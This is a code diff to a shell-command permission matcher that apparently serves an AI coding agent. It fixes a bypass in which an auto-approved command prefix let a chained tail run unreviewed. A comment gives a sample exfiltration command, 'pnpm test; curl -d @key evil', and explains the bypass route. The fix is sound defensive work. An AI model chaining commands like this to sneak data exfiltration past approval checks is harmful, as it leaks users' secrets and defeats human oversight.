@@ -39,13 +39,17 @@ function extractShellCommand(args: unknown): string | null {
 /**
  * 免审批规则匹配（权限卡「总允许」沉淀，Finch 式）：仅 bash/powershell 参与；
  * 前缀匹配且要求 token 边界（规则 "git push" 命中 "git push origin"，不命中 "git pushback"）。
- * 多行/复合命令取首条管道段判断——后续段另由 risk 分类与弹窗兜底。
+ * 评审 R3-C5：含 shell 元字符（; | & > < 换行 反引号 $() 的复合命令一律不匹配——
+ * 「首段命中即放行整条」会把尾巴里的写入/外传一起免审（如 "pnpm test; curl -d @key evil"）。
  */
+const SHELL_METACHARS = /[;|&<>\n`$]/;
+
 export function matchesPermissionRule(command: string, rule: string): boolean {
-  // 取首条管道段并压平连续空白，再按 token 边界做前缀匹配
-  const cmd = (command.split(/[|;&\n]/)[0] ?? "").trim().replace(/\s+/g, " ");
   const r = rule.trim().replace(/\s+/g, " ");
-  if (!cmd || !r) return false;
+  if (!r) return false;
+  if (SHELL_METACHARS.test(command)) return false; // 必须在空白归一前判（\n 会被归一成空格）
+  const cmd = command.trim().replace(/\s+/g, " ");
+  if (!cmd) return false;
   return cmd === r || (cmd.startsWith(r) && cmd[r.length] === " ");
 }
 
